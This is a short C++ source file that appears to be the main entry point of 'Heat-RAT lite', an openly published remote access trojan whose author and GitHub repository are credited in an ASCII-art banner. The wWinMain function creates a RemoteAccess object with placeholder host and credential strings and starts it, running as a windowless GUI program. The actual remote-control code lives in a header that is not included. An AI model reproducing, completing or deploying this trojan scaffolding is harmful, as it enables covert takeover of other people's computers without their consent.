/*
##########################################################################################################################
|....######....##.............######.....###...............####################.............######......###..............|
|....######....##.............#####.......##...............#.######.######.####..............#####.......##..............|
|..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....#####|
|..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....#####|
|..............##.............###............####.....#########################...........#####............#####....#####|
|....######....##.....##########..............###.....########################....##.......##..............#####....#####|
|....#####.....##..............................##.....####.....##.....##.....##....####......................###....#####|
|....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....#####|
|                                                    by: Nick_Vinesmoke                                                  |
|                                             https://github.com/Nick-Vinesmoke                                          |
|                                        https://github.com/Nick-Vinesmoke/Heat-RAT                                      |
##########################################################################################################################
*/

#include <Windows.h>
#include <iostream>
#include <string>

#include "HeatRat_lite.h"

/**
 * @brief Windows entry point for the application.
 *
 * This function is the main entry point for a Windows GUI application.
 *
 * @param hInstance The handle to the current instance of the application.
 * @param hPrevInstance Unused parameter, always set to NULL.
 * @param szCmdLine A pointer to the command-line arguments as a Unicode string.
 * @param CmdShow Controls how the window is to be shown.
 * @return The exit code for the application.
 */
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, int CmdShow)
{


    RemoteAccess ra = RemoteAccess("host", "username", "password");
    ra.start();


    return 0;
}
